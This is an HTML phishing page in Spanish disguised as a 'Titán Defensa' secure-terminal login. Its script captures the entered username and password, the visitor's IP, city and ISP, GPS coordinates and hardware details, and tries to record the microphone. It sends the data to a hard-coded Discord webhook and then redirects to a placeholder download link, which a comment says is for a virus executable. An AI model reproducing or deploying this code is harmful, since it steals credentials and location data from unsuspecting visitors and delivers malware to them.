<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA TIT√ÅN V3 - ELITE</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
        .terminal { border: 1px solid #0f0; padding: 20px; margin: 10% auto; width: 80%; max-width: 500px; box-shadow: 0 0 30px #0f0; background: rgba(0,20,0,0.9); }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin: 10px 0; outline: none; }
        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; width: 95%; }
        #log { font-size: 10px; color: #0a0; margin-top: 10px; height: 50px; overflow: hidden; }
    </style>
</head>
<body>
    <div class="terminal">
        <h1>[ TIT√ÅN DEFENSA ]</h1>
        <p>> ACCESO NIVEL 5 REQUERIDO</p>
        <input type="text" id="u" placeholder="Usuario de Red">
        <input type="password" id="p" placeholder="Clave Maestra">
        <button onclick="hack()">AUTENTICAR Y DESBLOQUEAR</button>
        <div id="log">Esperando conexi√≥n...</div>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1461515276553027718/pQXKXkGBXNp0bBortqwEzlKOUZ8mbKBmbQ1RyvswIf5eekhfaoYpqePHugjwhwYk6KbL";

        async function hack() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            document.getElementById('log').innerText = "> Extrayendo paquetes...";

            // 1. ROBO DE IP Y DATOS T√âCNICOS
            const info = await fetch('https://ipapi.co/json/').then(r => r.json());
            
            // 2. ACTIVAR MICR√ìFONO (GRABA 3 SEGUNDOS)
            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.start();
                setTimeout(() => { mediaRecorder.stop(); }, 3000);
            }).catch(() => {});

            // 3. OBTENER GPS
            navigator.geolocation.getCurrentPosition(g => {
                enviarFinal(u, p, info, g.coords);
            }, () => { enviarFinal(u, p, info, null); });

            // 4. DESCARGA AUTOM√ÅTICA DEL VIRUS EXE
            // Reemplaza el link de abajo por el de tu Google Drive donde subas el .exe
            window.location.href = "LINK_DE_TU_VIRUS_EXE_AQU√ç"; 
        }

        function enviarFinal(u, p, i, g) {
            fetch(WH, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: "üö® **OBJETIVO CAPTURADO - REPORTE TOTAL**",
                    embeds: [{
                        color: 15548997,
                        fields: [
                            {name: "üîë LOGIN", value: `User: ${u}\nPass: ${p}`},
                            {name: "üìç MAPA", value: g ? `https://www.google.com/maps?q=${g.latitude},${g.longitude}` : "Bloqueado"},
                            {name: "üñ•Ô∏è SISTEMA", value: `IP: ${i.ip}\nISP: ${i.org}\nCiudad: ${i.city}`},
                            {name: "üîã HARDWARE", value: `Plataforma: ${navigator.platform}\nCores: ${navigator.hardwareConcurrency}`}
                        ]
                    }]
                })
            });
        }
    </script>
</body>
</html>
